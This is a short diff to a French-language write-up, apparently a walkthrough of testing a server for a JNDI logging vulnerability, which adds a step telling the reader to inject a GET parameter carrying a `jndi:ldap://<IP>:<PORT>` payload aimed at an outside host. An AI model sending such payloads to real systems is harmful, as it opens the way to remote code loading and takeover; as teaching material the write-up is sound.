@@ -32,4 +32,6 @@ Il faut maintenant savoir si cette version est vulnérable, pour ça il faut d'a
 
 Ici, on voit clairement que les requêtes GET sont journalisées, l'url mais également **les paramètres**.
 
-Si le système est vulnérable, alors 
+Pour identifier la vulnérabilité du système, il suffit d'injecter un paramètres GET avec la charge utile suivante (expliquée dans la présentation de la faille) :
+
+`{jndi:ldap://<IP>:<PORT>}`
